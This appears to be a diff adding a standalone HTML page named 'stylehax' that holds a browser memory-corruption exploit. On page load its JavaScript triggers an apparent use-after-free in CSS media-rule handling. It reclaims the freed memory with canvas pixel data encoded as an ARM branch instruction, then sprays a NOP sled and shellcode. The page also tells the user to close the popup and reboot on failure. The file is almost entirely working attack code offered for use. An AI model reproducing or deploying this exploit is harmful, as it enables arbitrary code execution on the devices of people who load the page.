@@ -1,0 +1,86 @@
+<html>
+
+<head>
+   <title>stylehax</title>
+   <style id="style1">
+      @media all {
+         .test {
+            color: green;
+         }
+      }
+   </style>
+   <script>
+
+      var shellcode = "\ufffe\ueaff";
+
+      function exploit() {
+         var canvases = [];
+         var N = 0x900 / 2;
+         var obj_size = 0x28 * 2;
+
+         // create a bunch of canvases
+         for (var i = 0; i <= N; i++) {
+            var a = document.createElement("canvas");
+            a.width = obj_size / 4;
+            a.height = 1;
+            canvases[i] = a;
+            document.body.appendChild(a);
+         }
+
+         var styleSheet = document.getElementById('style1').sheet;
+         var mediaRule = styleSheet.cssRules[0];
+
+         var arr = new Array();
+         for (var i = 0; i <= N; i++) {
+            c = canvases[i].getContext("2d");
+            c.fillStyle = "rgb(0, 0, 0)";
+            c.fillRect(0, 0, obj_size / 4, 1);
+            arr[i] = c.getImageData(0, 0, obj_size / 4, 1).data[0];
+         }
+
+         try {
+            // fails with syntax error and throws exception, 
+            // but still adds some corrupted object to mediaRule.cssRules
+            mediaRule.insertRule("@media screen { p { color: green; } };", mediaRule.cssRules.length);
+         } catch (e) {
+
+         }
+
+         // empty mediaRule.cssRules
+         mediaRule.deleteRule(0);
+         mediaRule.deleteRule(0);
+
+         // try to reclaim memory of freed object with jump shellcode
+         var arr = new Array();
+         for (var i = 0; i <= N; i++) {
+            canvases[i].width = canvases[i].width;
+            c = canvases[i].getContext("2d");
+            // FE FF 13 EA -- b #0x500000
+            c.fillStyle = "rgba(254, 255, 19, 0.918)"
+            c.fillRect(0, 0, obj_size / 4, 1);
+            arr[i] = c.getImageData(0, 0, obj_size / 4, 1).data[0];
+         }
+
+         var nops = "\u0000";
+         while (nops.length < 0x1000) {
+            nops += nops;
+         }
+
+         var a = new Array();
+         for (var i = 0; i < 0x40; i++) {
+            a[i] = nops + shellcode;
+         }
+
+         mediaRule.cssRules.length;
+         alert("exploit failed. reboot and try again")
+      }
+   </script>
+</head>
+
+<body onload="exploit()">
+   <p>close the popup when it appears.</p>
+   <p>othwerise, don't touch anything.</p>
+   <p>if waited > 30 seconds, reboot and try again.</p>
+</body>
+
+</html>
